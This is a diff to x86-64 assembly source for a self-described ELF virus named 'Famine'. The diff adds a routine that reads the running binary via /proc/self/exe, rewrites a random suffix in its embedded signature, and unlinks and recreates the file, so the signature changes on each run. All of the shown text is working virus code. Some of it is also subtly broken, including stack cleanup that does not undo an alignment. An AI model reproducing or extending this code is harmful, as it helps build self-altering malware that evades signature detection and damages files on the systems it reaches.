@@ -258,6 +258,9 @@ _start.run_as_virus:
     sub rsp, VIRUS_STACK_SIZE
     and rsp, ~15                ; 16-byte align
 
+    ; Update own signature with new random suffix
+    call virus_update_self_signature
+
     ; For simplicity in virus mode, just do a minimal infection attempt
     ; Initialize file_count on stack
     mov qword [rsp], 0
@@ -334,9 +337,10 @@ v_firstDir:       db "/tmp/test", 0
 %ifndef BONUS_MODE
 v_secondDir:      db "/tmp/test2", 0
 %endif
-v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
-v_signature_len:  equ $ - v_signature - 1
+v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>"
+v_signature_len:  equ $ - v_signature
 v_random_suffix:  times RANDOM_SUFFIX_LEN db 0  ; Stores generated random alphanumeric suffix
+v_proc_self_exe:  db "/proc/self/exe", 0
 v_procdir:        db "/proc/", 0
 v_proc_status:    db "/status", 0
 v_proc_test_string: db "Name:	test", 10
@@ -435,6 +439,211 @@ virus_generate_random_suffix:
     pop rdi
     pop rdx
     pop rcx
+    pop rbx
+    pop rbp
+    ret
+
+; ============================================
+; virus_update_self_signature - Update random suffix in own binary
+; r15 = virus base address
+; Since we can't write to a running binary, we:
+; 1. Read our binary into memory
+; 2. Update the signature
+; 3. Unlink the original and write the new version
+; ============================================
+virus_update_self_signature:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
+    push r14
+    
+    ; Generate new random suffix
+    call virus_generate_random_suffix
+    
+    ; Allocate stack space for path buffer and read buffer
+    ; 256 for path, rest for file content buffer pointer
+    sub rsp, 272
+    and rsp, ~15                ; align
+    
+    ; Use readlink to get our own path
+    mov eax, SYS_READLINK
+    lea rdi, [r15 + v_proc_self_exe - virus_start]
+    mov rsi, rsp                ; buffer for path
+    mov edx, 256
+    syscall
+    
+    test rax, rax
+    jle .vuss_cleanup           ; Failed
+    
+    mov r13, rax                ; r13 = path length
+    
+    ; Null terminate the path
+    mov byte [rsp + r13], 0
+    
+    ; Open self for reading
+    mov eax, SYS_OPEN
+    mov rdi, rsp                ; path from readlink
+    mov esi, O_RDONLY
+    xor edx, edx
+    syscall
+    
+    test rax, rax
+    js .vuss_cleanup            ; Failed to open
+    
+    mov r12, rax                ; r12 = fd
+    
+    ; Get file size
+    mov eax, SYS_LSEEK
+    mov edi, r12d
+    xor esi, esi
+    mov edx, SEEK_END
+    syscall
+    
+    test rax, rax
+    jle .vuss_close_read        ; Failed or empty
+    
+    mov r14, rax                ; r14 = file size
+    
+    ; Allocate memory for file content using mmap
+    mov eax, SYS_MMAP
+    xor edi, edi                ; addr = NULL
+    mov rsi, r14                ; length = file size
+    mov edx, PROT_READ | PROT_WRITE
+    mov r10d, 0x22              ; MAP_PRIVATE | MAP_ANONYMOUS
+    mov r8d, -1                 ; fd = -1 for anonymous
+    xor r9d, r9d                ; offset = 0
+    syscall
+    
+    cmp rax, -1
+    je .vuss_close_read         ; mmap failed
+    
+    mov rbx, rax                ; rbx = buffer address
+    mov qword [rsp + 256], rbx  ; save buffer address
+    
+    ; Read entire file into buffer
+    mov eax, SYS_LSEEK
+    mov edi, r12d
+    xor esi, esi
+    xor edx, edx                ; SEEK_SET
+    syscall
+    
+    mov eax, SYS_READ
+    mov edi, r12d
+    mov rsi, rbx
+    mov edx, r14d
+    syscall
+    
+    ; Close read fd
+    mov eax, SYS_CLOSE
+    mov edi, r12d
+    syscall
+    
+    ; Search for signature in buffer and update it
+    xor r13, r13                ; r13 = current position
+    
+.vuss_search:
+    mov rax, r14
+    sub rax, r13
+    cmp rax, v_signature_len
+    jb .vuss_write_back         ; Not enough bytes left
+    
+    ; Compare signature
+    lea rdi, [rbx + r13]
+    lea rsi, [r15 + v_signature - virus_start]
+    mov rcx, v_signature_len
+    
+    push r13
+    xor r13, r13
+.vuss_cmp:
+    cmp r13, rcx
+    jge .vuss_sig_found
+    
+    mov r8b, [rdi + r13]
+    mov r9b, [rsi + r13]
+    cmp r8b, r9b
+    jne .vuss_next_pos
+    
+    inc r13
+    jmp .vuss_cmp
+    
+.vuss_next_pos:
+    pop r13
+    inc r13
+    jmp .vuss_search
+    
+.vuss_sig_found:
+    pop r13
+    
+    ; Update random suffix in buffer
+    lea rdi, [rbx + r13 + v_signature_len]
+    lea rsi, [r15 + v_random_suffix - virus_start]
+    mov rcx, RANDOM_SUFFIX_LEN
+.vuss_update:
+    test rcx, rcx
+    jz .vuss_write_back
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    dec rcx
+    jmp .vuss_update
+    
+.vuss_write_back:
+    ; Unlink the original file
+    mov eax, SYS_UNLINK
+    mov rdi, rsp                ; path
+    syscall
+    
+    ; Create new file
+    mov eax, SYS_OPEN
+    mov rdi, rsp                ; path
+    mov esi, O_WRONLY | O_CREAT | O_TRUNC
+    mov edx, 0o755              ; permissions (octal)
+    syscall
+    
+    test rax, rax
+    js .vuss_unmap              ; Failed to create
+    
+    mov r12, rax                ; r12 = new fd
+    
+    ; Write buffer to new file
+    mov eax, SYS_WRITE
+    mov edi, r12d
+    mov rsi, rbx
+    mov edx, r14d
+    syscall
+    
+    ; Close write fd
+    mov eax, SYS_CLOSE
+    mov edi, r12d
+    syscall
+    
+    jmp .vuss_unmap
+    
+.vuss_close_read:
+    mov eax, SYS_CLOSE
+    mov edi, r12d
+    syscall
+    
+.vuss_unmap:
+    ; Unmap buffer if allocated
+    mov rbx, qword [rsp + 256]
+    test rbx, rbx
+    jz .vuss_cleanup
+    
+    mov eax, SYS_MUNMAP
+    mov rdi, rbx
+    mov rsi, r14
+    syscall
+    
+.vuss_cleanup:
+    add rsp, 272                ; Remove buffers
+    
+    pop r14
+    pop r13
+    pop r12
     pop rbx
     pop rbp
     ret
